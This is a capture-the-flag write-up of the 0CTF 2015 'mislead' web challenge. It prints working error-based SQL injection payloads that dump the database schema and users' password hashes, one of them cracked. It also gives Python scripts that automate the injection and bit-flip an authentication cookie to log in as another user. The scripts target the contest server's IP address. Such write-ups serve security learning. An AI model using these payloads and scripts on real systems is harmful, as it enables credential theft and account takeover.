+++
author = "pwntester"
date = 2015-03-30T21:41:46Z
description = ""
draft = false
slug = "0ctf-2015-mislead-web-300"
title = "0CTF 2015 - mislead (web 300)"

+++

We are welcomed with a login page where we can register a new account and log in with it.
After logging to the application we received a:
```lang-raw
Hello pwntester. Try to login as 0ops!
```

The first thing I looked for was for SQL injection in the register and login forms. The register one turned to be injectable and we can use Duplicate entry technique to dump the DB:

Get the DB:
```lang-raw
username=pwner10&password='),(select 1 FROM(select count(*),concat((select (select concat(database())) FROM information_schema.tables LIMIT 0,1),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a) );#&submit=Submit
```
Output:
```lang-raw
SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'mislead1' for key 'group_key'<br>maybe another username?
```

Get the tables:
```lang-raw
username=pwner10&password='),(select 1 from (select count(*),concat((select(select concat(cast(table_name as char),0x7e)) from information_schema.tables where table_schema=database() limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)
 );#&submit=Submit
```
Output:
```lang-raw
SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'users~1' for key 'group_key'<br>maybe another username?
```

Get the columns:
```lang-raw
username=pwner10&password='),(select 1 from (select count(*),concat((select(select concat(cast(column_name as char),0x7e)) from information_schema.columns where table_name='users' limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)  );#&submit=Submit
```
Output:
```lang-raw
SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'id~1' for key 'group_key'<br>maybe another username?

SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'username~1' for key 'group_key'<br>maybe another username?

SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'password~1' for key 'group_key'<br>maybe another username?
```

Get the first user:
```lang-raw
 username=pwner10&password='),(select 1 from (select count(*),concat((select(select concat(cast(concat(username,0x7e,password) as char),0x7e)) from users limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)   );#&submit=Submit
```
Output:
```lang-raw
SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '0ops~13096de41fe9a97b700d4d9e21665484~1' for key 'group_key'<br>maybe another username?
```

YAY! We have the `MD5` for 0ops's password, we crack it, log in as 0ops and get our flag, easy, isnt it? Well, nope. MD5 is not in any hash DB, so we are back where we started.

One thing stands out when looking at the request:
```lang-raw
GET /mislead/index.php HTTP/1.1
Host: 202.112.26.101
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:36.0) Gecko/20100101 Firefox/36.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,es-ES;q=0.8,es;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Cookie: auth=YWVkMTM0MjNjYWZkY2IyMDgxODExNDcwM2E1ODY2NWZhYTAzMzY3ZjQ1ZjFjMjQxNmQxNjRjNGM1ZGM0ZDEwZA%3D%3D
Referer: http://202.112.26.101/mislead/login.php
Connection: keep-alive
```
Its a php application but its not using PHPSESSIONs but a custom `Auth`instead. This cookie is encoded in `base64` and then encoded in `hexadecimal`. But there is no useful info for us. We can assume that the cookie keeps the application state including the user associated to the session.

At this point, we decide to flip bits in the cookie to see if some changes/break and at some byte(14), the logging message changes and our names is modified. Cool! So we can try to bit-flip the cookie and get the username to be 0ops. For that, the easiest way is to register a name very similar (just one letter off) and bit-flip that byte until we get the right name.

All the usernames I tried were already picked so I started to think that someone register all those users once they got the flag (sign that we are in the right direction). I used the useless SQLi to pwn the pwners:

```lang-python line-numbers
import requests
url = 'http://202.112.26.101//mislead/register.php'
for i in xrange(4000):
	data = {
		'username': 'pwntester',
		'password': "'),(select 1 from (select count(*),concat((select(select concat(cast(concat(username,0x7e,password) as char),0x7e)) from users limit %d,1),floor(rand(0)*2))x from information_schema.tables group by x)a));#" % i,
		'submit': 'Submit',
	}
	res = requests.post(url, data=data)
	if "ops~" in res.text:
		print res.text
```
We get:
```lang-raw
~/CTFs/tasks/0CTF2k15/mislead> python pwn.py
SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry '0ops~13096de41fe9a97b700d4d9e21665484~1' for key 'group_key'<br>maybe another username?
SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry ' 0ops~698d51a19d8a121ce581499d7b701668~1' for key 'group_key'<br>maybe another username?
SQLSTATE[23000]: Integrity constraint violation: 1062 Duplicate entry 'Oops~c8837b23ff8aaa8a2dde915473ce0991~1' for key 'group_key'<br>maybe another username?
```
Ok, I will use `Oops` (Capital O) if md5 is easy to crack which it is `123321`

Now, log with this user and get the cookie: 
```lang-raw
YWVkMTM0MjNjYWZkY2IyMDgxODExNDcwM2E1ODY2NWZhYTAzMzY3ZjQ1ZjFjMjQxNmQxNjRjNGM1ZGM0ZDEwZA==
```

Using the following script, we can get the flag:
```lang-python line-numbers
import requests
from base64 import b64decode, b64encode
from hexdump import hexdump
import sys
import string

url = 'http://202.112.26.101//mislead/index.php'
OopsCookie = 'YWVkMTM0MjNjYWZkY2IyMDgxODExNDcwM2E1ODY2NWZhYTAzMzY3ZjQ1ZjFjMjQxNmQxNjRjNGM1ZGM0ZDEwZA=='
binCookie = b64decode(OopsCookie).decode("hex")
bytelength = len(binCookie)

def is_printable(s):
	for ch in s:
		if not ch in string.printable:
			return False
	return True

def flip_byte(msg, pos, byte=0x10):
	msg = msg[:pos] + chr(ord(msg[pos]) ^ byte) + msg[pos+1:]
	return msg

for i in xrange(bytelength):
	res = requests.get(url, cookies={'auth': b64encode(flip_byte(binCookie, i).encode("hex"))})
	print i, res.text
	if "Hello" in res.text and "Oops" not in res.text:
		for c in xrange(256):
			res = requests.get(url, cookies={'auth': b64encode(flip_byte(binCookie, i, c).encode("hex"))})
			if is_printable(res.text):
				print i, c, res.text
```
Output is:
```lang-raw
14 112 Hello ?ops. Try to login as 0ops!
14 113 Hello >ops. Try to login as 0ops!
14 114 Hello =ops. Try to login as 0ops!
14 115 Hello <ops. Try to login as 0ops!
14 116 Hello ;ops. Try to login as 0ops!
14 117 Hello :ops. Try to login as 0ops!
14 118 Hello 9ops. Try to login as 0ops!
14 119 Hello 8ops. Try to login as 0ops!
14 120 Hello 7ops. Try to login as 0ops!
14 121 Hello 6ops. Try to login as 0ops!
14 122 Hello 5ops. Try to login as 0ops!
14 123 Hello 4ops. Try to login as 0ops!
14 124 Hello 3ops. Try to login as 0ops!
14 125 Hello 2ops. Try to login as 0ops!
14 126 Hello 1ops. Try to login as 0ops!
14 127 Welcome to the 0ops secret place!<br>Just get your flag here :)<br>0ctf{w3_musT_kn0w_S0Me_crYpt0gr4phY}
```

FLAG is: `0ctf{w3_musT_kn0w_S0Me_crYpt0gr4phY}`
